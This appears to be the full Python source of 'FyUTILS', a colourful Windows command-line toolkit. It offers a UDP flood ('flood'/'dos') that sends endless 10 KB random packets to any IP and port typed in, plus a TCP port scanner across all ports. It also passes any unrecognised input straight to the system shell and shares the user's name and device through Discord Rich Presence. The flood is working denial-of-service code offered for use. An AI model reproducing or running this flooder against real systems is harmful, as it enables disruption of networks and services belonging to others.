try:
    import os
    import platform
    import sys
    import time
    import random
    import socket
    import requests
    import string
    import threading

    from datetime import datetime
    from colorama import Fore, init
    from pypresence import Presence

except:
    os.system("pip install colorama")
    os.system("pip install datetime")
    os.system("pip install pypresence")
    os.system("pip install requests")
    import os, platform, sys, time, random, socket, requests, string
    from datetime import datetime
    from colorama import Fore, init
    from pypresence import Presence

init(convert=True)


class Thread(threading.Thread):
    def __init__(self, threadID, name):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name

    def run(self):
        threadLock.acquire()
        flood()
        threadLock.release()


def uid_gen(size):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for char in range(size))


def prefix(arg):
    if arg == "INFO" or arg == "WARN" or arg == "ERROR" or arg == "INIT" or arg == "SUCCESS":
        if threading.current_thread().name == "MainThread":
            thread_name = "MAIN"
        else:
            thread_name = threading.current_thread().name
        pre = Fore.LIGHTBLACK_EX + "[" + Fore.CYAN + datetime.now().strftime("%H:%M:%S") + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTBLACK_EX + "(" + Fore.CYAN + "FyUTILS" + Fore.LIGHTBLACK_EX + "/" + Fore.WHITE + str(arg) + Fore.LIGHTBLACK_EX + ") " + Fore.LIGHTBLACK_EX + "[" + Fore.WHITE + thread_name + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE
    else:
        raise NameError
    return pre


def update_status(state):
    try:
        os.system(
            "title FyUTILS " + version + "-" + version_type + " - " + username + "@" + device + " - " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state=state, details=username + "@" + device, small_image="python",
                   large_image="fyutils",
                   buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python", large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def add_command_detail(state):
    try:
        os.system(
            "title FyUTILS " + version + "-" + version_type + " - " + username + "@" + device + " - " + "Running: " + cmd + " " + state)
    except:
        os.system("title " + state)
    try:
        rpc.update(state="Running: " + cmd + " " + state, details=username + "@" + device, small_image="python",
                   large_image="fyutils", buttons=[{"label": "github.com/NoahOnFyre/FyUTILS",
                                                    "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
                   small_text="Python", large_text="FyUTILS v" + version + "-" + version_type,
                   start=int(rpc_start_time))
    except:
        None


def menu():
    os.system("cls")
    print(color() + "  __________               _____  __   ________   ________   ______       ________")
    time.sleep(0.03)
    print(color() + "  ___  ____/  _____  __    __  / / /   ___  __/   ____  _/   ___  /       __  ___/")
    time.sleep(0.03)
    print(color() + "  __  /_      __  / / /    _  / / /    __  /       __  /     __  /        _____ \ ")
    time.sleep(0.03)
    print(color() + "  _  __/      _  /_/ /     / /_/ /     _  /       __/ /      _  /___      ____/ / ")
    time.sleep(0.03)
    print(color() + "  /_/         _\__, /      \____/      /_/        /___/      /_____/      /____/  ")
    time.sleep(0.03)
    print(color() + "              /____/                                                              ")
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + directory)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + version_type)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")


def color():
    config = open(directory + "\\config.txt").readlines()[0]
    if config.rstrip() == "GREEN":
        rc = Fore.GREEN
    elif config.rstrip() == "LIME":
        rc = Fore.LIGHTGREEN_EX
    elif config.rstrip() == "AQUA" or config == "CYAN":
        rc = Fore.CYAN
    elif config.rstrip() == "YELLOW":
        rc = Fore.YELLOW
    elif config.rstrip() == "PINK" or config == "MAGENTA":
        rc = Fore.MAGENTA
    elif config.rstrip() == "WHITE":
        rc = Fore.WHITE
    elif config.rstrip() == "RED":
        rc = Fore.RED
    elif config.rstrip() == "BLUE":
        rc = Fore.BLUE
    elif config.rstrip() == "LAVA":
        rc = Fore.LIGHTRED_EX
    else:
        return Fore.WHITE
    return rc


def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((floodtarget, floodport))
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")
    try:
        for i in range(sys.maxsize):
            uid = uid_gen(6)
            sock.send(random.randbytes(10240))
            print(prefix("INFO") + "Attacking: " + color() + floodtarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
                floodport) + Fore.WHITE + "..." + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "Attack: " + color() + str(
                i + 1) + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "UID: " + color() + uid, end='\r')

        print("\n")
    except KeyboardInterrupt:
        print("\n" + prefix("INFO") + Fore.WHITE + "Canceling Action...")
    except:
        print("\n" + prefix("ERROR") + Fore.WHITE + "Target doesn't respond!")
        time.sleep(3)
    print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
    print(prefix("INFO") + "Disconnecting from " + color() + floodtarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
        floodport) + Fore.WHITE + "...")
    try:
        sock.close()
        time.sleep(0.1)
    except:
        print(prefix("ERROR") + "Cannot disconnect from target!")
    print(prefix("INFO") + "Cleaning up...\n")


def portscan():
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")
    try:
        print(prefix("INFO") + "Preparing scan.", end='\r')
        time.sleep(0.1)
        print(prefix("INFO") + "Preparing scan..", end='\r')
        time.sleep(0.1)
        print(prefix("INFO") + "Preparing scan...", end='\r')
        for scanport in range(1, 65535):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.05)
            result = sock.connect_ex((scantarget, scanport))
            print(prefix("INFO") + "Scanning Port... " + color() + str(scanport), end='\r')
            if result == 0:
                print(prefix("SUCCESS") + "Port " + color() + str(scanport) + Fore.WHITE + " is open!                ")
            sock.close()
        print("\n")
    except KeyboardInterrupt:
        print("\n" + prefix("INFO") + "Canceling Action...")
    except:
        print("\n" + prefix("ERROR") + "Target doesn't respond!")
        time.sleep(3)
    print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
    print(prefix("INFO") + "Disconnecting from " + color() + scantarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
        scanport) + Fore.WHITE + "...")
    try:
        sock.close()
        time.sleep(0.1)
    except:
        print(prefix("ERROR") + "Cannot disconnect from target!")
    print(prefix("INFO") + "Cleaning up...\n")


os.system("title Initializing RPC...")
print(prefix("INIT") + "Initializing RPC...")

try:
    rpc = Presence("1005822803997638696")
    rpc.connect()
    rpc_start_time = time.time()
    update_status("Starting up...")
except:
    print(prefix("ERROR") + "Can't connect with the discord RPC.")
    time.sleep(0.5)

#
# Variable initialisation
#

print(prefix("INIT") + "Initializing variables...")
os.system("title Initializing variables...")
time.sleep(0.03)
username = os.getlogin()
device = platform.node()
directory = sys.path.__getitem__(0)
threads = os.cpu_count()
version = "1.2"
version_type = "STABLE"
private_ip = socket.gethostbyname(socket.gethostname())
try:
    print(prefix("INIT") + "Checking online status...")
    os.system("title Checking online status...")
    time.sleep(0.03)
    public_ip = requests.get("https://api.ipify.org").content.decode()
except:
    public_ip = "Not online!"
time.sleep(0.03)

#
# Multithreading initialisation
#

print(prefix("INIT") + "Initializing multithreading...")
os.system("title Initializing multithreading...")
threadLock = threading.Lock()
threadList = []
for thread_count in range(1, 4 + 1):
    thread = Thread(thread_count, "WORKER-" + str(thread_count))
    threadList.append(thread)

#
# Config initialisation
#

print(prefix("INIT") + "Initializing config...")
os.system("title Initializing config...")
time.sleep(0.03)
try:
    open(directory + "\\config.txt").readlines()[0]
except:
    print("Config not found! Creating config...")
    time.sleep(0.03)
    open(directory + "\\config.txt", "x").writelines("AQUA")
    time.sleep(0.03)
    print(Fore.WHITE + "Please restart FyUTILS!")
    time.sleep(0.03)
    os.system("pause")
    time.sleep(0.03)
    sys.exit()
print(prefix("INIT") + "Initialization phase passed successfully!")
os.system("title Initialization phase passed successfully!")
try:
    time.sleep(3)
except KeyboardInterrupt:
    None
print("")

menu()
while True:
    try:
        update_status("Idle")
        try:
            cmd = input(
                Fore.LIGHTBLACK_EX + "╔═══[" + color() + username + Fore.LIGHTBLACK_EX + "@" + Fore.WHITE + device + Fore.LIGHTBLACK_EX + "]═══(" + color() + "FyUTILS " + Fore.WHITE + version + Fore.LIGHTBLACK_EX + "-" + Fore.WHITE + version_type + Fore.LIGHTBLACK_EX + ")" + "\n" + "╚═══" + Fore.LIGHTBLACK_EX + "> " + Fore.WHITE).lower()
        except KeyboardInterrupt:
            update_status("Shutting down...")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1)
            rpc.close()
            sys.exit()
        update_status("Running: " + cmd)

        if cmd == "exit" or cmd == "quit":
            update_status("Shutting down...")
            print("")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1)
            try:
                rpc.close()
            except:
                None
            sys.exit()

        elif cmd == "rl" or cmd == "reload" or cmd == "clear" or cmd == "cls":
            print("")
            update_status("Reloading...")
            print("")
            menu()

        elif cmd == "rs" or cmd == "restart" or cmd == "new":
            print("")
            update_status("Restarting...")
            print("")
            os.system("start " + directory + "\\FyUTILS.py")
            sys.exit()

        elif cmd == "flood" or cmd == "dos":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                floodtarget = input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                floodport = int(input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target port" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                activity_start = time.time()
                add_command_detail(floodtarget + ":" + str(floodport))
                flood()
            except:
                None

        elif cmd == "color" or cmd == "clr":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                colorvalue = input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Value" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE).upper()
                add_command_detail(colorvalue)
                open(directory + "\\config.txt", "w").writelines(colorvalue)
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Changes saved to file!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
            except:
                print("")

        elif cmd == "resetconfig" or cmd == "rcnf" or cmd == "configreset":
            print("")
            update_status("Resetting config files...")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "The config has been reset!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                open(directory + "\\config.txt", "w").writelines("AQUA")
                print("")
            except:
                print("")

        elif cmd == "vars" or cmd == "variables" or cmd == "var":
            print("")
            update_status("Getting system variables...")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + directory)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Threads:   " + str(threads))
            time.sleep(0.03)
            print(
                Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + version_type)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Private:   " + private_ip)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Public:    " + public_ip)
            time.sleep(0.03)
            print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
            print("")

        elif cmd == "portscan" or cmd == "scanport":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                scantarget = input(
                    Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                activity_start = time.time()
                add_command_detail(scantarget)
                portscan()
            except:
                None

        else:
            os.system(cmd)
            print(Fore.WHITE)

        update_status("Idle")
    except KeyboardInterrupt:
        print("")
